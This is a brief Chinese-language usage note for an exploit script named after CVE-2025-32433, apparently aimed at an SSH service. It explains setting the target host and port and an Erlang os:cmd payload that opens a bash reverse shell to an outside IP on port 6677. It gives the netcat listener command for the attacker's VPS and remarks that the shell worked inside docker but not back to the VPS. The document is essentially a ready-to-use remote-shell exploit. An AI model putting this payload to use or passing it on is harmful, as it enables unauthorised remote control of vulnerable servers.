CVE-2025-32433-Rebound-shell.py:

使用方法：python环境直接运行改代码，不需要参数，只需要修改代码头中定义的相关变量即可

 ```
  - HOST：目标ip
  - PORT：目标ip ssh服务端口
  - run_command：'os:cmd("bash -c \'bash -i >& /dev/tcp/38.47.101.230/6677 0>&1\'").'
  				修改vps ip port即可
 ```

 

vps：

```
nc -lvnp port
```



cve-2025-32433-github-run-command：实验 docker里可以弹主机，但无法弹vps
